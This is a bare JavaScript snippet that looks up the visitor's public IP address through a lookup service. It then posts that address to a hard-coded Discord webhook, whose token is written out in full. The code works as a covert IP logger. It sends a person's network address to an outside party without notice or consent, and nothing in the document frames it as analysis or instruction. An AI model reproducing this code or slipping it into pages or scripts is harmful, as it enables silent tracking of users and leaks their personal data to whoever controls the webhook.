var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1125085555022119014/8zPxC6vE53eCcrp4uCi-3uemuZiuDxcu4W-L5JPIZa1GLnyTLgUU_Z5bLax7kfPNB-Xk';
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});
